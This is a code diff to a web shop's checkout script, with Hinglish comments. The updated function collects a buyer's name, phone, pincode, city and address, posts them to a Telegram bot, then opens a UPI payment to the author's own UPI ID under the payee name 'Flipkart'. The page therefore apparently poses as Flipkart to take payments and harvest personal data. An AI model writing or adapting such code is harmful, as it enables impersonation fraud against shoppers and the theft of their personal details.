@@ -542,18 +542,35 @@ init = function() {
         }
 
         async function confirmPay() {
+    // Sari details collect karna
     const name = document.getElementById('uName').value;
-    const selName = sel.name.substring(0, 15); // Product ka chhota naam
+    const phone = document.getElementById('uPhone').value;
+    const pincode = document.getElementById('uPin').value;
+    const city = document.getElementById('uCity').value;
+    const address = document.getElementById('uAdd').value;
 
-    // --- Message Prepare Karna ---
-    // Maine yahan Naam aur Product dono ko mix kar diya hai
-    const upiNote = encodeURIComponent(`Order: ${selName} by ${name}`);
+    // Message format for Telegram
+    const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
+                `📦 *Item:* ${sel.name}\n` +
+                `💰 *Price:* ₹${sel.price}\n\n` +
+                `👤 *Name:* ${name}\n` +
+                `📞 *Phone:* ${phone}\n` +
+                `📍 *Pin:* ${pincode}\n` +
+                `🏙️ *City:* ${city}\n` +
+                `🏠 *Add:* ${address}`;
 
-    // Telegram par details bhejna
-    const msg = `🔥 *NEW ORDER* 🔥\nItem: ${sel.name}\nCustomer: ${name}`;
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
-    // UPI App open karna Note ke saath
+    try {
+        await fetch(url);
+    } catch (e) {
+        console.log("Telegram failed but moving to payment");
+    }
+
+    // --- UPDATED UPI LINK WITH MESSAGE ---
+    // Note: Isse UPI ID ke niche message dikhega
+    const upiNote = encodeURIComponent(`Order: ${sel.name.substring(0, 15)} by ${name}`);
+    
     window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&tn=${upiNote}`;
 }
 
